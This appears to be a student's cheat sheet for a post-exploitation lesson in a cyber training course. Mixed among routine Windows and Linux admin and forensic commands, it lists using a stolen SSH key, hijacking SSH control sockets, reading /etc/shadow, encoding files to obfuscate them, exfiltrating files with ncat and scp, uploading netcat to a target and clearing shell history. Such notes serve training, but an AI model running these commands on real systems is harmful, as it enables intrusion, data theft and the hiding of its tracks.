https://sec.cybbh.io/public/security/latest/lessons/lesson-8-post_sg.html
https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/08-post-exploitation.html

SSH KEY THEFT
  chmod 600 /home/student/stolenkey
  ssh -i /home/student/stolenkey jane@1.2.3.4


CONTROL SOCKETS CONFIG
  ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>

  ssh -S /tmp/s x@x
  scp -o 'ControlPath=/tmp/s' x@x:<Path>

  View established connections on destination system
  ss -ntp

  Examine SSH authentication entries on destination system
  tail /var/log/auth.log


---ENUMERATION---
WINDOWS 
USER
  net user  net localgroup    wmic useraccount get name,sid
PROCESS
  tasklist /v
  wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list
  wmic process where (processid=#) get parentprocessid,commandline
SERVICE
  tasklist /svc    net start     wmic service list status    
  Get-Service \ | Where {$_.Status -eq "Running"}
NETWORK
  ipconfig /all     wmic netuse list full
  qwinsta           net use
  netstat /anob     net view
  arp -a            route print

OBFUSCATION (Windows)
  type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
  certutil -encode <file> encoded.b64


LINUX
USER
  cat /etc/passwd    getent passwd    cat /etc/shadow
  last    who    w    whoami    groups    id
PROCESS
  ps -elf
  ps auxf
  pstree
  lsof
SERVICE
  chkconfig                   # SysV
  systemctl --type=service    # SystemD
  systemctl list-units --type service
  service --status-all
  systemctl list-units --type=service \| grep running
NETWORK
  ifconfig -a      # SysV (deprecated)
  ip a             # SystemD
  arp -an
  ip route  OR  route  OR  netstat -r  OR ip r
  ss  OR  netstat
    Options:
-a - displays all listening and non-listening ports
-l - displays only listening ports
-n - displays numeric IP addresses and ports
-p - displays process-id and program name (for root only)
-u - displays UDP sockets
-t - displays TCP sockets
OBFUSCATION (Linux)
  cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
  cat <file>> | base64

DATA EXFIL
Session Transcript
  ssh <user>@<host> | tee
Encrypted Transport
  scp <source> <destination>
  ncat --ssl <ip> <port> < <file>

Linux session logging:
  ssh user@target | tee /var/tmp/activity.log
Windows session logging:
  ssh user@target | tee-object C:\temp\activity.log


Data Transfer Through SSH
  ssh -p PORT +
  scp -P PORT +
  sftp -P PORT +

Upload Through Control Sockets
  # ssh -M -S <control/socket/location> <USER>@<TARG_IP>
  <enter password>
  scp -o 'ControlPath=<control/socket/location>' [LOCAL/FILE/TO/TRANSFER] [USER]@<TARG_IP>:[/DEST/FILENAME]
  scp -o 'ControlPath=/tmp/s' /tmp/netcat root@127.0.0.1:/tmp/netcat

Download/Exfil Through Control Sockets
  scp -o 'ControlPath=<control/socket/location>' [USER]@<TARG_IP>:[/FILE/TO/DOWNLOAD] [/LOCAL/DOWNLOAD/FILE/LOCATION]
  scp -o 'ControlPath=/tmp/s' root@127.0.0.1:/tmp/netcat .






===FULL ENUM COMMANDS===

---WINDOWS---
NETSH (BUILT-IN):   Purpose:  Locally or remotely, display or modify the network configuration of a computer that is currently running.
	SYNTAX:		netsh interface ?                                                                   - Display help for netsh and and its sub commands (in this case interface)
    netsh firewall reset                                                                            - Completely removes/resets firewall settings
    netsh firewall set opmode enable                                                                - Enabled Windows Firewall
    netsh firewall set opmode disable                                                               - Disabled Windows Firewall
    netsh firewall set icmpsetting type=all mode=enable                                             - Enable All ICMP Traffic
    netsh firewall set icmpsetting type=8 mode=enable                                               - Allow inbound echo request
    netsh interface show interface                                                                  - Display all network interfaces on localmachine
    netsh interface ip show address                                                                 - Display IP Address; DHCP;Subnet; Gateway of network interfaces
    netsh interface ip set address local static 192.168.18.111 	255.255.255.0 192.168.18.254 1      - Set static IP Address; Subnet; Gateway; GatewayMetric
    netsh interface ip set dns name=local source=static addr=192.168.118.101                        - Set a static DNS for local interface
    netsh interface ip show dns                                                                     - Display DNS information on network interface
    netsh interface ip delete dns local 192.168.118.1                                               - Removes static DNS entry of 192.168.118.1 on the local interface
    netsh advfirewall firewall show rule name="svchost service"                                     - Confrim if service svchost rule name exists
    netsh advfirewall export "c:\FW-Before-Changes.wfw"                                             - Create a BACKUP of the netsh firewall configuration
    netsh advfirewall import "c:\FW-Before-Changes.wfw"                                             - Restore netsh firewall configuration from BACKUP
    netsh advfirewall firewall show rule name=all                                                   - View firewall configuration
    netsh advfirewall show allprofiles                                                              - See if Windows Firewall is enabled for the Domain, Private, and Public networks
    netsh advfirewall show currentprofile                                                           - Show which profiles are active
    netsh advfirewall firewall show rule profile=private name=all                                   - Display all the rules for the private profile

WMIC (BUILT-IN):
	SYNTAX: wmic ,alias. <where clause> <verb clause>
    wmic process get /?                                                                             - all fields I can get
    wmic process where "name like '%.exe" call getowner
    wmic netuse list brief                                                                          - briefly lists data of any active network connections
    wmic netuse list full                                                                           - gives all data of any active connections
    wmic netuse get name, connectionstate, username                                                 - lists only the name, connection state, and username of any active connections
    wmic useraccount get name,sid                                                                   - get all user names and sids
    wmic fsdir where (name="C:\\Windows") get lastmodified, lastaccessed, creationdate, name        - Lists the Name and MAC of C:\Windows
    wmic process where "name like '%.exe'" call getowner                                            - get list of *.exe process owners
    wmic process where "caption like 'cmd.exe'" get /format:list                                    - List information about process cmd.exe in a list format
    wmic process where processid="772" list brief                                                   - Briefly list the information of your current command shell process
    wmic process where name="explorer.exe" call getowner                                            - Get username for a process (Explorer.exe in this case)
    wmic process get Name,Commandline,ExecutablePath,HandleCount,Priority,ThreadCount /format:list  - Retrieves the Name,Commandline,ExecutablePath,HandleCount,Priority,ThreadCount for every process in list format
    wmic datafile where name='c:\\windows\\system32\\calc.exe'                                      - View file properties on a process (calc.exe)
    wmic OS Get DataExecutionPrevention_Available                                                   - Get DEP status
    wmic OS Get DataExecutionPrevention_SupportPolicy                                               - Get DEP Policy
    wmic startup get caption,command                                                                - View Startup Proccesses

ARP (BUILT-IN):	  Purpose: Displays and modifies the IP-to-Physical address translation tables used by address resolution protocol (ARP).
    arp -a inet_address                                     - Displays current ARP entries for inet_address only
    arp -a                                                  - Displays current ARP entries +
    arp -d 192.168.0.1                                      - Removes ARP mappings for 192.168.0.1 + on all interfaces.

NBTSTAT (BUILT-IN):   Purpose: Displays protocol statistics and current TCP/IP connections using NBT (NetBIOS over TCP/IP).
    nbtstat -a [RemoteName]                                 - Lists remote machine's name table given its NAME
    nbtstat -A [IP address]                                 - Lists remote machine's name table given its IP Address
    nbtstat -n                                              - Lists local NetBIOS names (Displays Name, Type, Status)
    nbtstat -RR                                             - (Flush NetBIOS Cache) Sends Name Release packets to WINS and then, starts Refresh

IPCONFIG (BUILT-IN):   Purpose: Provides detailed networking information on host:
    ipconfig /all                                           - Displays Verbose information on all Network Interfaces
    ipconfig /displaydns                                    - Display the contents of the DNS Resolver Cache
    ipconfig /flushdns                                      - Purges the DNS Resolver Cache
    ipconfig /displaydns                                    - Display current DNS resolver cache (includes host file entry)

NET COMMANDS (BUILT-IN):
    net start                                               - View a list of running services
    net start <service name>                                - Start service
    net stop <service name>                                 - Stop service
    net use                                                 - Displays Network Shares
    net start | find /v /c "~~~"                            - count services

NET GROUP (BUILT-IN):	Purpose: Creates Domain Groups

NET LOCALGROUP (BUILT-IN):	Purpose: Creates Local Groups
    net localgroup "Power Users" /add moe                   - Add user moe to the local group Power Users
    net localgroup "Users" /delete larry                    - Remove user Larry from Local Group Users

NET SHARE (BUILT-IN):	Purpose: Display and configure Local and Remote Network Shares
    SYNTAX:		net share [NetShareName]=[Drive\Share]      - Create a network share
    SYNTAX:     net share <sharename>=<drive>:<path>        - Maps a share from remote host
    net share derp /delete                                  - Delete network share named "derp"
    net share progfiles="C:\Program Files"                  - SHare Program Files directy as progfiles

NET USE (BUILT-IN):	  Purpose: Display Map Network Shares
    net use Z: \\10.50.50.52\classrom

NET USER (BUILT-IN): 	Purpose: User Management
    net user                                                - Show Users currently logged on to box.
    net user [UserName]                                     - Displays details about User (UserName,Comments,AccountStatus,PasswordInfo,LogonInfo,Memberships)
    net user [UserName] [password] /add                     - Add New User  (use * for password for a prompt to enter password securely)
    net user [UserName] /delete                             - Delete a User
    net user [UserName] [Password]                          - Change password
    net user [UserName[ /active:no                          - Disable User Account
    net user [UserName] /times:[Day],[TIME]                 - Set logon time for Users.  Day = M, T, W, Th, F, Sa, Su  Time= 3PM-11PM or 15-23
    net user curly /delete                                  - Remove Curly's user account
    net user joe /active:no                                 - Disable Joe's account
    net user joe                                            - Displays details about joe (UserName,Comments,AccountStatus,PasswordInfo,LogonInfo,Memberships)
    net user user /comment:"Leader of Stooges" moe          - Add "Leader of Stooges" as USER comments to users account
    net user joe /times:M,3PM-11PM;T,3PM-11PM;              - Set Logon Times for Joe to be Monday and Tuesday 3PM-11PM ONLY

NET VIEW (BUILT-IN):	Purpose: Displays a list of domains, computers, or resources that are being shared by the specified computer.
    net view                                                - Displays ServerName and Remarks of computers in your current domain.

TASKLIST (BUILT-IN):    Purpose: This command line tool displays a list process currently running local\remote system.
    tasklist /FI "[FilterName] [Operator] [Value]"          - Filter Process List
    tasklsit /FO [table OR list OR csv]                     - Format Process List
    tasklist /svc                                           - List of services
    tasklist /M                                             - List the DLL's associated with each process
    tasklist /svc /fi “imagename eq svchost.exe”            - Finds only processes that are svchost.exe and associated services
    tasklist /fo list /v                                    - Formats into a list, and shows verbose
    tasklist /FI "IMAGENAME eq cmd.exe" /M                  - Lists all DLL's associated with a specific process (cmd.exe in this case)
    tasklist /V /FI "MODULES eq mswsock.dll"                - List all process associated with the WIndows Socket DLL
    tasklist /svc /fi "services eq dnscache"                - List Process responsible for a service (DNS Client Service in this case)
    tasklist /FI "IMAGENAME eq explorer.exe" /V             - List username AND MORE associated with a process (explorer.exe in this case)
    tasklist /m /FI "IMAGENAME eq cmd.exe"                  - List dlls for cmd.exe

SC (Windows Resource Kit):    Purpose: CLI program used to communicate with NT Service Controller and Services (WindowsXP and above)
    SYNTAX: sc <server> [command] [service name] <option1> <option2>
    sc query [ServiceName]                                  - configuration & status info
    sc start                                                - Start Service
    sc stop                                                 - Stop Service
    sc config [ServiceName] [Options]                       - Configure Service
    sc enumdepend [ServiceName]                             - Displays services depending on a particular service
    sc qc [ServiceName]                                     - more detailed configuration info
    sc getdisplayname                                       - Provides DisplayName
    sc getkeyname [DisplayName]                             - Gets Name of Service via the DisplayName
    sc config wzcsvc start= demand                          - Sets Wireless Service to Manual
    sc config WZCSVC start= disable                         - Sets Wireless Service to Disabled
    sc getkeyname "Wireless Zero Configuration"             - Gets the ServiceName from the DisplayName "Wireless Zero Configuration"
    sc qc WZCSVC                                            - Gets properties of ServiceName (Example: Binary)



---LINUX---
***************************
* System Characterization *
***************************
    \unset HISTFILE HISTSIZE HISTFILESIZE                   - removes the history of your current commands
    date                                                    - current system date and time
    uname -a                                                - prints kernel name, release, and version
    	uname -r                                            - prints kernel release
    	cat /etc/*rel*                                      - prints information regarding the OS
    	cat /etc/issue (distro)
    ifconfig -a                                             - prints netowrk information/conkfiguration
    w                                                       - prints logged on users and what they are doing
    last                                                    - show a listing of last logged in users
    uptime                                                  - shows how long the system has been running
    hostid                                                  - print the numeric identifier for the current host
    vmstat                                                  - prints virtual memory statistics
    hostname                                                - show or set the system's host name
    arp -an                                                 - print the ARP cache
    netstat -rn                                             - prints the kernel routing tables

    Linux
    	cat /proc/cpuinfo
    	lsmod                                               - lists the loaded modules
    	ip route show (Newer Linux)                         - lists the kernel routing tables

    Solaris
    	psrinfo -v (processor info)
    	modinfo -c (list all the kernel modules)

    ps -efH                                                 - prints every process on the system using standard syntax with process hierarchy
    netstat -tunap                                          - print all network connections with associated PID


*************
* Processes *
*************
Linux
    pstree                                                  - display a tree of processes
    ps -auxf                                                - prints every process on the system including CPU and MEM usage
    ps -efH (elf)                                           - prints every process on the system using standard syntax with process hierarchy
    lsof                                                    - lists all open files belonging to all active processes
        lsof -p <pid>
    	lsof -c <command_name>                              - listing of files for processes executing the command <command_name>
    	lsof -i <4|6>                                       - only files of the indicated IP version, IPv4 or IPv6, are displayed
    logs
    	grep <process_name> /var/log/*                      - search through all files in the directory for a file containing <process_name>
    	tail -f /var/log/messages                           - prints the last 10 lines of /var/log/messages
    find / -name *<process_name>*                           - starting in "/", find something conatining the phrase <process_name>
    chkconfig --list | grep <process_name>                  - queries runlevel information for system services

Solaris
    ptree
    ps
    	running from /tmp, /var/tmp, or any user's home directory
    	running from a location outside a /bin or /sbin or /opt directory may deserve special scrutiny
    	Odd options for services

    By comparing the output of the pfiles /proc/* command and the outputs of the netstat -an and rpcinfo -p commands, you can identify services
    	By cross-referencing listening port numbers in the netstat -na output with ports found in the output of the pfiles `echo /proc/*` command, the output from ps -ef, and the list of well-known ports, you can determine running services

***********************
* Network Connections *
***********************
arp -an                                                     - (default gateway)
netstat -rn                                                 - (routing table)

Linux
    netstat -auntp
    	ss -an                                              - (show all sockets without name resolution)
    	ss -anp                                             - (show process information as well)
    	ss -aep                                             - (show all sockets with detailed information and process associated)
    lsof (not on CentOS)
    	readlink -f /proc/<PID>/exe
    /proc/
    	ls -al /proc/<pid>
    ls -al /proc/<pid>/fd | grep \/                         - (only directories are seen)
    cat /proc/<pid>/maps
    ps -fp <PID>

Solaris
    netstat -anP tcp
    	-anP udp
    pfiles
    /proc/

    pfiles `ptree | awk '{print $1}'`| egrep '^[0-9]|port:' >> /tmp/ports
    	rpcinfo -p

*********
* Other *
*********
/etc/passwd
    /bin/false or /bin/nologin for system services
    find / -name password.txt > /tmp/pwdfiles &

Command history
    history

PPID

Dump services
    Solaris
    	svcs
    Linux
    	service --status-all
    	chkconfig --list

Networking for services
    lsof -i
    pfiles `ptree | awk '{print $1}'`| egrep '^[0-9]|port:'

Logging
    grep -R <service-name> /var/log
    file /var/log/secure; file /var/log/wtmp; file /var/log/messages
    head[tail] /var/log/[secure | messages]
    strings /var/log/wtmp

IPTables
    iptables --list
    iptables --list -t nat
    /etc/sysconfig/iptables

    ip6tables --list
    ip6tables --list -t nat
    /etc/sysconfig/ip6tables

Locations to check
    /
    /tmp
    /home
    /dev/shm

    find for all hidden files
    	find / -type f -name ".*"
    find for all hidden directories
    	find / -type d -name ".*"

USERSPACE INITIALIZATION FILES
    Initialization files
    	/etc/inittab
    	/etc/rc.d/rc
    	/etc/rc.d/rc.sysinit
    	/etc/rc.d/rc.local
    	/etc/rc.d/rc#.d/ rc scripts

    Init scripts

    Scheduled tasks
    	ls -l /etc/cron*
    	/var/spool/crontab
    		for user in $(cut -f1 -d: /etc/passwd); do echo $user >> /tmp/crontabs; crontab -u $user -l >> /tmp/crontabs; done
    	at
    		/var/spool/at

    Login scripts
    	user home directories
    		cat /home/user/.bash_history
    		cat /home/user/.rc.local






